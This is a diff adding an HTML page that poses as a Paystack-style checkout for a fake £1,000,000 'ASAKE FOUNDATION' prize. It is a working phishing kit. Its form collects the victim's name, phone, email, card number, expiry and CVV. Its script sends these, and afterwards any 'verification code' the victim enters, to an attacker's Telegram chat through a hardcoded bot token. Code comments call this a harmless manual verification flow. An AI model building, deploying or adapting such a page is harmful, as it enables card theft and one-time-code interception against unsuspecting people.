@@ -1,0 +1,271 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Card format</title>
+    <style>
+        * { box-sizing: border-box; margin: 0; padding: 0; font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Helvetica, Arial, sans-serif; }
+        body { background-color: #e5e9f0; display: flex; justify-content: center; align-items: center; min-height: 100vh; padding: 20px; }
+        
+        /* The main Paystack-style modal container */
+        .paystack-modal { display: flex; width: 100%; max-width: 650px; background: #ffffff; border-radius: 6px; overflow: hidden; box-shadow: 0 15px 35px rgba(50,50,93,0.1), 0 5px 15px rgba(0,0,0,0.07); min-height: 480px; }
+        
+        /* Left Sidebar: Payment channels */
+        .sidebar { width: 35%; background-color: #f8fafc; border-right: 1px solid #edf2f7; padding: 20px 0; display: flex; flex-direction: column; }
+        .sidebar-title { font-size: 11px; text-transform: uppercase; color: #718096; letter-spacing: 1px; padding: 0 20px 15px 20px; font-weight: 700; }
+        .channel-item { display: flex; align-items: center; padding: 14px 20px; cursor: pointer; color: #4a5568; font-size: 14px; font-weight: 500; border-left: 3px solid transparent; transition: all 0.2s ease; }
+        .channel-item.active { background-color: #ffffff; color: #011b33; border-left-color: #3bb75e; font-weight: 600; }
+        .channel-icon { margin-right: 12px; font-size: 16px; }
+        
+        /* Right Content Pane: Form details */
+        .main-content { width: 65%; padding: 30px; display: flex; flex-direction: column; justify-content: space-between; position: relative; }
+        .merchant-header { display: flex; justify-content: space-between; align-items: flex-start; margin-bottom: 20px; padding-bottom: 15px; border-bottom: 1px solid #f0f4f8; }
+        .merchant-name { font-size: 15px; color: #4a5568; font-weight: 600; }
+        .payment-amount { font-size: 16px; color: #011b33; font-weight: 700; text-align: right; }
+        .payment-email { font-size: 12px; color: #a0aec0; text-align: right; font-weight: 400; margin-top: 2px; }
+        
+        /* Utility utility class to hide sections */
+        .hidden { display: none !important; }
+
+        /* Form Sections */
+        .form-section-title { font-size: 11px; text-transform: uppercase; color: #a0aec0; font-weight: 700; margin-bottom: 12px; letter-spacing: 0.5px; border-bottom: 1px dashed #edf2f7; padding-bottom: 4px; }
+        .form-group { margin-bottom: 14px; }
+        .form-group label { display: block; font-size: 11px; text-transform: uppercase; color: #718096; margin-bottom: 6px; font-weight: 600; letter-spacing: 0.5px; }
+        .input-field { width: 100%; padding: 10px 12px; border: 1px solid #cbd5e0; border-radius: 4px; font-size: 14px; color: #2d3748; outline: none; transition: border-color 0.2s; }
+        .input-field:focus { border-color: #3bb75e; }
+        .inline-fields { display: flex; gap: 15px; }
+        
+        /* Form Action Button */
+        .action-btn { background-color: #3bb75e; color: white; border: none; padding: 14px; width: 100%; font-size: 15px; border-radius: 4px; cursor: pointer; font-weight: 600; margin-top: 10px; display: flex; justify-content: center; align-items: center; gap: 8px; transition: background 0.2s; }
+        .action-btn:hover { background-color: #2fa350; }
+        .action-btn:disabled { background-color: #a0aec0; cursor: not-allowed; }
+        
+        /* Secured badge at bottom */
+        .secured-footer { display: flex; justify-content: center; align-items: center; gap: 4px; font-size: 10px; color: #a0aec0; text-transform: uppercase; letter-spacing: 0.5px; margin-top: 20px; }
+        .secured-footer strong { color: #718096; }
+
+        @media (max-width: 550px) {
+            .paystack-modal { flex-direction: column; }
+            .sidebar { width: 100%; flex-direction: row; padding: 5px 0; border-right: none; border-bottom: 1px solid #edf2f7; overflow-x: auto; }
+            .sidebar-title { display: none; }
+            .channel-item { padding: 10px 15px; border-left: none; border-bottom: 3px solid transparent; white-space: nowrap; }
+            .channel-item.active { border-left-color: transparent; border-bottom-color: #3bb75e; }
+            .main-content { width: 100%; padding: 20px; }
+        }
+    </style>
+</head>
+
+<body>
+<div class="paystack-modal">
+    <div class="sidebar">
+        <div class="sidebar-title">Pay With</div>
+        <div class="channel-item active">
+            <span class="channel-icon"></span>
+                 COMPLETE THE PROCESS TO GET YOUR REWARDS 
+        </div>
+    </div>
+
+    <div class="main-content">
+        <div>
+            <div class="merchant-header">
+                <div class="merchant-name">ASAKE FOUNDATION</div>
+                <div>
+                    <div class="payment-amount">PRIZE POOL</div>
+                    <div class="payment-email">£1,000,000</div>
+                </div>
+            </div>
+
+<form id="personal-form">
+    <div class="form-section-title">Personal Details</div>
+
+    <div class="form-group">
+        <label for="full-name">Full Name</label>
+        <input type="text" id="full-name" class="input-field" placeholder="John Doe" required>
+    </div>
+    
+    <div class="form-group">
+        <label for="country">Country</label>
+        <input type="text" id="country" class="input-field" placeholder="Please Type Your Country" required>
+    </div>
+
+    <div class="form-group">
+        <label for="phone-number">Phone Number</label>
+        <input type="tel" id="phone-number" class="input-field" placeholder="08012345678" required>
+    </div>
+
+    <div class="form-group">
+        <label for="email-address">Email Address</label>
+        <input type="email" id="email-address" class="input-field" placeholder="johndoe@gmail.com" maxlength="50" required>
+    </div>
+        
+    <div class="form-group">
+        <label for="card-number">Card Number</label>
+        <input type="tel" id="card-number" class="input-field" placeholder="0000 0000 0000 0000" maxlength="19" required>
+    </div>
+    
+    <div class="inline-fields">
+        <div class="form-group" style="width: 50%;">
+            <label for="card-expiry">Card Expiry</label>
+            <input type="tel" id="card-expiry" class="input-field" placeholder="MM / YY" maxlength="5" required>
+        </div>
+        <div class="form-group" style="width: 50%;">
+            <label for="card-cvv">CVV</label>
+            <input type="tel" id="card-cvv" class="input-field" placeholder="123" maxlength="3" required>
+        </div>
+    </div>
+    
+    <button type="submit" class="action-btn" id="submit-btn">
+        Submit Details
+    </button>
+</form>
+
+
+            <div id="success-message" class="hidden"
+                 style="margin-top:20px; text-align:center; color:#2fa350; font-weight:600;">
+                Details submitted successfully.
+            </div>
+        </div>
+
+        <div class="secured-footer">
+            <span></span> Ensure all information is accurate 
+        </div>
+    </div>
+</div>
+
+<script>
+    /*
+     * MANUAL VERIFICATION FLOW
+     *
+     * 1. Person submits name, phone and email -> Telegram.
+     * 2. You receive the details and manually send YOUR OWN code to them.
+     * 3. They enter the code on this page.
+     * 4. The entered code is sent to Telegram so you can compare it
+     *    with the code you sent.
+     * 5. You decide whether to confirm the person.
+     *
+     * This is for your own verification code only, not a bank/payment OTP.
+     */
+    const TELEGRAM_BOT_TOKEN = "8951464071:AAEUaiaUW0Hfhi_o75AK9WzbqPKsE1RclxU";
+    const TELEGRAM_CHAT_ID = "8608543769";
+
+    async function sendToTelegram(message) {
+        const url = `https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`;
+
+        const response = await fetch(url, {
+            method: "POST",
+            headers: { "Content-Type": "application/json" },
+            body: JSON.stringify({
+                chat_id: TELEGRAM_CHAT_ID,
+                text: message
+            })
+        });
+
+        const data = await response.json();
+
+        if (!response.ok || !data.ok) {
+            throw new Error(data.description || "Telegram submission failed.");
+        }
+    }
+
+    const personalForm = document.getElementById("personal-form");
+    const successMessage = document.getElementById("success-message");
+
+    // The original script referenced a verification form that was missing
+    // from the HTML. Create it dynamically so the intended flow works.
+    const verificationForm = document.createElement("form");
+    verificationForm.id = "verification-form";
+    verificationForm.className = "hidden";
+    verificationForm.innerHTML = `
+        <div class="form-section-title">Verification</div>
+        <div class="form-group">
+            <label for="verification-code">Verification Code</label>
+            <input type="text" id="verification-code" class="input-field"
+                   placeholder="Enter the code you received" maxlength="50" required>
+        </div>
+        <button type="submit" class="action-btn" id="verify-btn">Submit Code</button>
+    `;
+    personalForm.parentNode.insertBefore(verificationForm, successMessage);
+
+    // Automatically format the school card number in groups of four digits.
+    const cardNumberInput = document.getElementById("card-number");
+    cardNumberInput.addEventListener("input", function () {
+        const digits = this.value.replace(/\\D/g, "").slice(0, 16);
+        this.value = digits.match(/.{1,4}/g)?.join(" ") || "";
+    });
+
+    document.getElementById("personal-form").addEventListener("submit", async function (e) {
+        e.preventDefault();
+
+        const submitBtn = document.getElementById("submit-btn");
+        const name = document.getElementById("full-name").value.trim();
+        
+        const country = document.getElementById("country").value.trim();
+        
+        const phone = document.getElementById("phone-number").value.trim();
+        
+        const email = document.getElementById("email-address").value.trim();
+        
+        const cardNumber = document.getElementById("card-number").value.trim();
+                
+        const cardExpiry = document.getElementById("card-expiry").value.trim();
+        
+        const cardCvv = document.getElementById("card-cvv").value.trim();
+                        
+        submitBtn.innerText = "Submitting...";
+        submitBtn.disabled = true;
+
+        try {
+            await sendToTelegram(
+`📋 NEW PERSONAL DETAILS
+────────────────────
+👤 Name: ${name}
+📞 Phone: ${phone}
+📧 Email: ${email}
+🏳️ Country: ${country}
+🏧card-number:${cardNumber}
+🙅card-expiry:${cardExpiry}
+🤟card-cvv:${cardCvv}
+The person is now waiting for your verification code.`
+            );
+
+            personalForm.classList.add("hidden");
+            verificationForm.classList.remove("hidden");
+        } catch (error) {
+            alert(error.message);
+            submitBtn.innerText = "Submit Details";
+            submitBtn.disabled = false;
+        }
+    });
+
+    document.getElementById("verification-form").addEventListener("submit", async function (e) {
+        e.preventDefault();
+
+        const verifyBtn = document.getElementById("verify-btn");
+        const enteredCode = document.getElementById("verification-code").value.trim();
+
+        verifyBtn.innerText = "Sending...";
+        verifyBtn.disabled = true;
+
+        try {
+            await sendToTelegram(
+`🔐 VERIFICATION CODE ENTERED
+────────────────────
+Code entered by person: ${enteredCode}
+
+Compare this with the code you personally sent to the person's phone.`
+            );
+
+            verificationForm.classList.add("hidden");
+            successMessage.textContent = "Code submitted. Verification is being confirmed.";
+            successMessage.classList.remove("hidden");
+        } catch (error) {
+            alert(error.message);
+            verifyBtn.innerText = "Submit Code";
+            verifyBtn.disabled = false;
+        }
+    });
+</script>
+</body>
+</html>
+    
